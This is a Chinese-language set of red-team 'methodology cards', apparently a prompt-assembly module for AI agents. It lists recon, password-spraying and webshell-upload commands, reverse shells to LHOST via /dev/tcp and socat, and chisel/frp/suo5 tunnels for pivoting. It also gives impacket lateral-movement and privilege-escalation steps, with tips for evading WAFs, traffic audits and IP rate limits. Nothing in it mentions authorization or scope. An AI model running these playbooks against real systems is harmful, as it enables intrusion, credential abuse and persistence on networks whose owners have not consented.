# 方法论库 · Methodology Packs

来自 `dsh-purge/skills/redteam/` 的 20 张能力卡，**去本地化**（工具路径 → `TOOL_BIN`，主机 → `TARGET`）后并入本技能。

`scripts/assemble.mjs --methodology <id,id>` 按需挂载；不挂载时这些内容不占上下文。

每张卡的固定结构：**触发 → 链路 → 关键命令 → 坑**。坑是最值钱的部分——那是踩出来的。

---

## 侦察

### recon-pipeline
触发：拿到域名或单位名，要系统铺开资产面。
链路：子域枚举 → 泛解析过滤/解析 → 端口 → 存活与技术栈 → 页面与接口。四步顺序固定，不能跳。
关键命令：
```bash
subfinder -d DOMAIN -all -silent -o subs.txt
dnsx -l subs.txt -a -resp -silent -o resolved.txt
naabu -l resolved.txt -top-ports 1000 -silent -o ports.txt
httpx -l resolved.txt -sc -title -tech-detect -o live.txt
gau DOMAIN | anew urls.txt
```
坑：`/usr/bin/httpx` 是 Python 库的 CLI，不是 ProjectDiscovery 的；用 `pd-httpx` 或绝对路径。无 root 时 naabu 走 `-scan-type c`。

### passive-recon
触发：禁止主动发包，或需要"零接触"摸底。
链路：证书透明 → 被动 DNS → 搜索引擎/备案 → 代码托管与历史快照。
关键命令：
```bash
curl -s "https://crt.sh/?q=%25.DOMAIN&output=json" | jq -r '.[].name_value' | sort -u
```
坑：证书透明会把历史子域全吐出来，含大量已下线资产，必须配合存活探测二筛。

### fofa-recon
触发：需要按指纹/资产特征反查，而不是按域名。
链路：语法拼装 → 分页拉取 → 去重 → 存活 → 入库。
关键命令：`fofa_search "domain=\"DOMAIN\" && country=\"CN\"" --size 500 --fields host,ip,port,title,server`
坑：API 有配额，先小样本验证语法再放大；`cert` / `body` 字段最费配额。

### web-fingerprint
触发：已发现 HTTP 服务，要定技术栈。
链路：响应头 → 页面特征（favicon 哈希、静态资源路径、报错页、robots）→ 主动模板识别 → 版本比对。
关键命令：
```bash
whatweb -a 3 http://TARGET
nuclei -u http://TARGET -tags tech -silent
```
坑：favicon 哈希要先 md5 再查库；同一套 CMS 的不同版本报错页差异极大，别只看标题。

### dir-bruteforce
触发：要摸隐藏路径与接口。
链路：字典选型 → 状态码过滤 → 递归 → 人工复核。
关键命令：
```bash
ffuf -u http://TARGET/FUZZ -w WORDLIST -t THREADS -rate RATE -mc 200,204,301,302,403 -o dir.json
```
坑：先跑小字典探 WAF，再上大字典；403 往往是有效路径（存在但禁止），别当噪声丢掉。

### nuclei-scan
触发：已知技术栈，要批量验漏洞。
链路：模板筛选（按 tag/severity）→ 限速跑 → 复核误报。
关键命令：
```bash
nuclei -l live.txt -tags cve,rce -severity high,critical -rate-limit RATE -o nuclei.txt
```
坑：默认模板集会打登录口和上传口，先 `-etags intrusive` 排掉；误报率在高版本模板上明显上升，人工复核不可省。

---

## 突破

### unauth-exploit
触发：发现未授权访问 / 默认口令 / 信息泄露接口。
链路：确认无鉴权 → 取数据边界 → 判断能否升级为写操作 → 落证据。
关键命令：
```bash
curl -i "http://TARGET/API_ENDPOINT" -H "Content-Type: application/json"
```
坑：先只读后写；写操作前确认幂等，避免把测试数据写进生产。

### credential-attack
触发：有登录口，要试口令。
链路：用户枚举 → 口令喷洒（低速、单口令多账号）→ 命中后立即验证权限边界。
关键命令：
```bash
nxc smb TARGET -u users.txt -p 'PASSWORD' --continue-on-success
hydra -L users.txt -p 'PASSWORD' TARGET http-post-form "/login:u=^USER^&p=^PASS^:F=invalid"
```
坑：撞库 ≠ 喷洒。喷洒是"一个口令打所有账号"，锁定风险低；字典撞库一晚上能把域账号锁死一片。

### webshell-toolkit
触发：拿到上传点或文件包含。
链路：确认解析 → 上传最小马 → 验证执行 → 换稳定通道（隧道/RAT）。
关键命令：`curl -F "file=@shell.php.jpg;type=image/jpeg" http://TARGET/upload`
坑：先确认目标是否真的解析双扩展名；上传目录常禁执行，找到可执行目录再传，否则白留痕迹。

---

## 立足

### shell-handler
触发：需要收一个反弹 shell。
链路：选协议（TCP/HTTP/DNS）→ 起监听 → 触发 → 升级为交互式 → 转隧道。
关键命令：
```bash
nc -lvnp LPORT
# 目标侧
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
坑：出网限制严时 TCP 直连必挂，先测 DNS/HTTP 出网；拿到 shell 立刻记 TTY 大小与 $PATH，后面提权脚本依赖它。

### vps-reverse-shell
触发：目标只允许出网到特定端口/域名。
链路：VPS 起 listener → 域名前置 → 端口 443/80 伪装 → 落地。
关键命令：`socat TCP-LISTEN:443,reuseaddr,fork EXEC:bash,pty,stderr`
坑：云厂商对新 VPS 的 25/445 出站默认封；443 最稳。落地前先 `curl -m 5 https://LHOST` 验证回连。

### chisel-tunnel
触发：需要 SOCKS 代理穿 HTTP。
链路：服务端起 → 目标连回 → 本地 SOCKS5 → 挂代理跑工具。
关键命令：
```bash
chisel server -p 8080 --reverse
# 目标
chisel client LHOST:8080 R:socks
```
坑：`R:socks` 默认 1080；多级跳用 `R:1081:socks`，别和本地已有代理抢端口。

### frp-tunnel
触发：需要长期稳定的内网穿透。
链路：frps 配置 → frpc 配置 → 端口映射 → 验证。
关键命令：`frpc -c frpc.ini`（`[socks5] type=tcp remote_port=6000 plugin=socks5`）
坑：frp 特征明显，流量侧一眼识别；对流量审计敏感的目标换 suo5 或 DNS 隧道。

### suo5-tunnel
触发：只有 Web 口，且 WAF 会拦 webshell 流量。
链路：上传 suo5 服务端 → 本地客户端连 → SOCKS5。
关键命令：`suo5 -c http://TARGET/tunnel -l 1080`
坑：依赖目标支持长连接/分块；Nginx 默认 `proxy_read_timeout` 60s 会掐断，先确认超时配置。

---

## 内网

### fscan-intranet
触发：已进内网，要快速摸清网段。
链路：存活 → 端口 → 常见服务爆破 → 漏洞指纹。
关键命令：`fscan -h CIDR -p 22,80,445,3389 -o scan.txt`
坑：默认并发高，容易打崩老设备；生产网段先 `-t 200` 降并发。

### gogo-intranet
触发：需要更细的指纹与漏洞关联。
链路：网段扫描 → 指纹 → 漏洞标记 → 结果入库。
关键命令：`gogo -i CIDR -p top2 -v --af`
坑：主动指纹必须加 `-v`，否则只做被动识别，会漏掉大量自研系统。

### lateral-movement
触发：已有可用凭据，要横向。
链路：凭据可用性验证 → 目标选择（高价值优先）→ 执行通道（WMI/WinRM/SMB/SSH）→ 落新凭据。
关键命令：
```bash
nxc smb TARGET -u USER -p 'PASSWORD' -x whoami
impacket-wmiexec DOMAIN/USER:'PASSWORD'@TARGET
```
坑：横向优先打"有会话的机器"，不是"权限高的机器"——域管登录过的工作站比域控好下手。

### privilege-escalation
触发：拿到低权 shell。
链路：系统信息 → 补丁/内核 → 服务与计划任务 → 凭据文件 → 利用。
关键命令：
```bash
whoami /priv & systeminfo
# Linux
id; sudo -l; find / -perm -4000 2>/dev/null
```
坑：先看 `sudo -l` 和 SUID，90% 的 CTF 与相当比例的真实环境在这两步就结束；内核 exp 是最后手段，崩了就是事故。

---

## 支撑

### browser-automation
触发：目标有复杂前端、验证码、或需要登录态。
链路：接管已登录浏览器 → 复用 Cookie → 走真实交互 → 抓 XHR。
关键命令：`node -e "require('playwright')..."`（或用 agent-desktop 走无障碍树）
坑：别新开无痕上下文——登录态在默认 profile 里；风控看的是 TLS 指纹与行为节奏，不是 UA。

### cn-proxy-pool
触发：需要国内出口 IP，或要绕过 IP 频控。
链路：池子来源 → 可用性探测 → 按目标地域选出口 → 限速。
关键命令：`curl -x http://PROXY:PORT -m 8 https://ifconfig.me`
坑：免费池子 90% 已死或已被目标拉黑；先测再上，别让扫描器直接吃 403。

---

## 用法

```bash
# 只挂侦察三件套
node scripts/assemble.mjs --preset claude-sonnet --methodology recon-pipeline,web-fingerprint,dir-bruteforce

# 全挂（注意预算）
node scripts/assemble.mjs --preset gpt-class --methodology recon-pipeline,passive-recon,fofa-recon,web-fingerprint,dir-bruteforce,nuclei-scan --budget 16000
```

包名必须与上面的 `### id` 完全一致；`assemble.mjs` 找不到就静默跳过——所以挂载后看一眼 `dropped` 与 `packs` 统计。
